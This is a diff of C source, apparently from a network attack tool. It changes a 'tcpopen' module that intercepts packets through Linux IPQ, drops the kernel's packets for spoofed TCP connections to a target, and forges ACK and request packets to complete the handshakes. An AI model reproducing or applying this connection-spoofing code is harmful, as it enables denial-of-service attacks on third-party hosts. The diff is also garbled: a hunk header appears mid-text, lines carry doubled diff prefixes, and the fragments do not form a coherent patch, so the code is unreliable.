@@ -36,15 +36,10 @@
 #include "ip.h"
 #endif
 
-typedef struct _tag_LISTENER_CFG {
-  LN_CONTEXT    lnc;
-} LISTENER_CFG;
-
 typedef struct _tag_IPQLISTENER_CFG {
   unsigned    npackets;
   char       *req;
   unsigned    req_size;
-  LN_CONTEXT *lnc;
 } IPQLISTENER_CFG;
 
 #define ip_protocol(x) (((struct iphdr *) (x))->protocol)
@@ -55,11 +50,6 @@ typedef struct _tag_IPQLISTENER_CFG {
 /*****************************************************************************
  * LISTENER THREAD
  *****************************************************************************/
-
-static void tea_timer_listener_thread_cleanup(void *x)
-{
-  /* nothing here */
-}
 
 static void tea_timer_listener_thread(THREAD_WORK *tw)
 {
@@ -84,9 +74,16 @@ static void tea_timer_listener_thread(THREAD_WORK *tw)
       tea_timer_push_msg(tw, m->b, m->s);
       pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
       pthread_testcancel();
-    } else
+    } else {
+#warn "decide here the best policy for not handled packets in IPQ."
       if(ipqex_set_verdict(&tw->msg, NF_DROP) <= 0)
         ERR("Cannot DROP IPQ packet.");
+#if 0
+      /* policy: accept anything unknown */
+      if(ipqex_set_verdict(&tw->msg, NF_ACCEPT) <= 0)
+        ERR("[LL_%02u] Cannot ACCEPT IPQ packet.", tw->w->id);
+#endif
+    }
   }
 
   /* finish him */
@@ -94,86 +91,36 @@ static void tea_timer_listener_thread(THREAD_WORK *tw)
   pthread_exit(NULL);
 }
 
-  /* initialize */
-  DBG("Initializing IPQ...");
-  if(ipqex_init(&attack_tcpopen__ipq, BUFSIZE))
-    FAT("  !! Cannot initialize IPQ.");
-
-  /* up! */
-  return pthreadex_flag_up(&attack_flag);
-
+static void tea_timer_listener_thread_cleanup(void *x)
+{
   /* finalize ipq */
   ipqex_destroy(&attack_tcpopen__ipq);
+}
+
+static int tcpopen__configure(THREAD_WORK *tw, SNODE *command)
+{
+  IPQLISTENER_CFG *tc = (IPQLISTENER_CFG *) tw->data;
+
+  /* initialize specialized work thread data */
+  if(tc == NULL)
+  {
+    if((tc = calloc(1, sizeof(IPQLISTENER_CFG))) == NULL)
+      D_FAT("[%02d] No memory for IPQLISTENER_CFG.", tw->id);
+    tw->data = (void *) tc;
+
+    /* initialize ipq */
+    DBG("[%02u] Initializing ipq.", tw->id);
+    if(ipqex_init(&attack_tcpopen__ipq, BUFSIZE))
+      FAT("  !! Cannot initialize IPQ.");
+  }
+
+  return 0;
+}
+
 
   /* flag that will keep attack threads waiting for work */
 
 @@ -59,118 +59,66 @@ static pthreadex_flag_t    attack_flag;
--    if((status = ipqex_msg_read(&(tw->msg), 0)) <= 0)
-+    /* but ... in some circumstances ... */
-+    if(ipqex_get_ip_header(&(tw->msg))->protocol == 6
-+    && ipqex_get_ip_header(&(tw->msg))->daddr == tw->cfg.shost.addr.in.addr
-+    && ipqex_get_tcp_header(&(tw->msg))->source == tw->cfg.dhost.port)
-     {
--    } else {
--      /* but ... in some circumstances ... */
--      if(ipqex_get_ip_header(&(tw->msg))->protocol == 6
--      && ipqex_get_ip_header(&(tw->msg))->daddr == tw->cfg.shost.addr.in.addr
--      && ipqex_get_tcp_header(&(tw->msg))->source == tw->cfg.dhost.port)
-+      DBG("[LL_%02u] Received a spoofed connection packet.", tw->w->id);
-+      /*
-+      DBG2("[LL_%02u] Dropped << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
-+              tw->w->id,
-+              ipqex_identify_ip_protocol(&(tw->msg)),
-+              (ipqex_get_ip_header(&(tw->msg))->saddr >>  0) & 0x00ff,
-+              (ipqex_get_ip_header(&(tw->msg))->saddr >>  8) & 0x00ff,
-+              (ipqex_get_ip_header(&(tw->msg))->saddr >> 16) & 0x00ff,
-+              (ipqex_get_ip_header(&(tw->msg))->saddr >> 24) & 0x00ff,
-+              ipqex_get_tcp_header(&(tw->msg))->dest, cfg->dhost.port,
-+              ipqex_get_tcp_header(&(tw->msg))->rst,
-+              ipqex_get_ip_header(&(tw->msg))->saddr,
-+              cfg->shost.s_addr);
-+      */
-+
-+      /* ignore any packet that have anything to do with this connection */
-+      if(ipqex_set_verdict(&tw->msg, NF_DROP) <= 0)
-+        ERR("[LL_%02u] Cannot DROP IPQ packet.", tw->w->id);
-+
-+      /* in some special case (handshake) send kakitas */
-+      if(ipqex_get_tcp_header(&(tw->msg))->syn != 0
-+      && ipqex_get_tcp_header(&(tw->msg))->ack != 0)
-       {
--        DBG("[LL_%02u] Received a spoofed connection packet.", tw->w->id);
--        /*
--        DBG2("[LL_%02u] Dropped << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
--                tw->w->id,
--                ipqex_identify_ip_protocol(&(tw->msg)),
--                (ipqex_get_ip_header(&(tw->msg))->saddr >>  0) & 0x00ff,
--                (ipqex_get_ip_header(&(tw->msg))->saddr >>  8) & 0x00ff,
--                (ipqex_get_ip_header(&(tw->msg))->saddr >> 16) & 0x00ff,
--                (ipqex_get_ip_header(&(tw->msg))->saddr >> 24) & 0x00ff,
--                ipqex_get_tcp_header(&(tw->msg))->dest, cfg->dhost.port,
--                ipqex_get_tcp_header(&(tw->msg))->rst,
--                ipqex_get_ip_header(&(tw->msg))->saddr,
--                cfg->shost.s_addr);
--        */
--
--        /* ignore any packet that have anything to do with this connection */
--        if(ipqex_set_verdict(&tw->msg, NF_DROP) <= 0)
--          ERR("[LL_%02u] Cannot DROP IPQ packet.", tw->w->id);
--
--        /* in some special case (handshake) send kakitas */
--        if(ipqex_get_tcp_header(&(tw->msg))->syn != 0
--        && ipqex_get_tcp_header(&(tw->msg))->ack != 0)
--        {
--          /* send handshake and data TCP packet */
--          DBG("[LL_%02u]   - Request packet sending...", tw->w->id);
--          ln_send_packet(&(tw->lnc),
--                         &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
--                         &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
--                         TH_ACK,
--                         ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
--                         ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
--                         ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
 -                         NULL, 0);
 -          ln_send_packet(&(tw->lnc),
 -                         &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
